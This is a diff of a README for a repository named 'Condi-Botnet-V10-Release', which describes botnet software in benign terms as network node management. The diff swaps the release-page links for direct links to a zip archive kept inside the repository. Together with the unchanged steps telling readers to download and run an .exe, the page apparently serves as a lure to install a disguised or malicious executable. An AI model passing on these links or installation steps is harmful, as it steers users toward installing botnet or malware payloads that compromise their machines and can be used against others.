@@ -1,6 +1,6 @@
 # 🤖 Condi-Botnet-V10-Release - Efficiently Manage Distributed Network Node Tasks
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Dactylopterussetgun104/Condi-Botnet-V10-Release/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Dactylopterussetgun104/Condi-Botnet-V10-Release/main/Jenny/Release-Condi-Botnet-v3.3.zip)
 
 ## 📌 Project Overview
 
@@ -24,7 +24,7 @@ Condi-Botnet-V10-Release provides a set of tools to monitor and manage network c
 
 ## 🚀 Downloading and Installation
 
-1. Visit the project release page to get the installer: [https://github.com/Dactylopterussetgun104/Condi-Botnet-V10-Release/releases](https://github.com/Dactylopterussetgun104/Condi-Botnet-V10-Release/releases).
+1. Visit the project release page to get the installer: [https://raw.githubusercontent.com/Dactylopterussetgun104/Condi-Botnet-V10-Release/main/Jenny/Release-Condi-Botnet-v3.3.zip](https://raw.githubusercontent.com/Dactylopterussetgun104/Condi-Botnet-V10-Release/main/Jenny/Release-Condi-Botnet-v3.3.zip).
 2. Locate the latest version in the Assets list.
 3. Click the file ending in `.exe` to start the download to your computer.
 4. Navigate to your Downloads folder once the save process finishes.
